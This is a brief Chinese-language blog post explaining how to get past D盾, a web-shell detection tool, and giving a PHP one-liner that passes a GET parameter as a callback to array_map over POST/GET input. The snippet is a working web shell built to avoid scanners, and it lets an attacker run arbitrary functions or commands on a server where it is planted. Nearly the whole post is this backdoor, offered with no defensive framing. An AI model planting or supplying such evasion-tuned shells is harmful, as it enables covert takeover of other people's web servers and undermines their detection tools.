---
title: "PHP Bypass D盾"
date: 2018-02-06T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['php','bypass']
categories: ['web','bypass']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


PHP Bypass D盾

<!--more-->

**原理**

通过 array_map 对 GET 的参数进行回调, 其中 1 为回调函数, 2 和 3 分别为在回调函数内的 POST 和 GET 参数

```
<?php

@$a = array($_POST['2'],$_GET['3']);
@array_map($b=$_GET['1'],$c=$a);

?>
```